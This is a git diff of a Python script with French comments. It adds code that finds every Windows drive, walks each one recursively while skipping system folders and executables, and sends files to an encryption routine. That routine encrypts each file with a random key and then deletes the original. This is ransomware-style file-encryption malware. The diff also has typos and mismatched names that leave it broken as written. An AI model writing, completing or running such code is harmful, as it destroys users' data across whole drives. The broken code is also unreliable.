@@ -9,14 +9,42 @@ from pathlib import Path
 key = os.urandom(32) 
 iv = os.urandom(16)
 
-extensions_exclues = (".exe", ".dll", ".sys", ".bat", ".com")
+extensions_exclus = (".exe", ".dll", ".sys", ".bat", ".com")
 
+folders_exckus = [
+    "windows",
+    "/program files",
+    "/program files (x86)",
+    "/system volume information",
+    "/$recycle.bin",
+    "/.git",
+]
+
+max_size = 100 * 1024 * 1024
+
+def is_in_excluded_folder(fiel_path: Path):
+    path_str str(file_path).lower()
+    for exclu in folders_exclus : 
+        if exclu in path_str:
+            return True
+    return False
+
+def get_existing_root_path():
+    root_path = []
+    for letter in  string.ascii_uppercase:
+        drive = f"{letter}:/"
+        if Path(drive).exists():
+            root_path.append(drive)
+    return root_path
 
 def search_file(base_path):
     #convertion le str path au path
     base_path = Path(base_path)
     #lire recurive le dossier
     for file in base_path.rglob("*"):
+        if is_in_excluded_folder(file):
+            continue
+        
         #verifer que le ficher ne pas ficher de systeme
         if file.is_file() and not file.suffix.lower() in extensions_exclues:
             try:
@@ -52,4 +80,9 @@ def encrypte_file(input_file):
     os.remove(input_file)
 
     return True
-    
+
+def main():    
+    paths = get_existing_root_path()
+    for path in paths : 
+        search_file(path)
+        
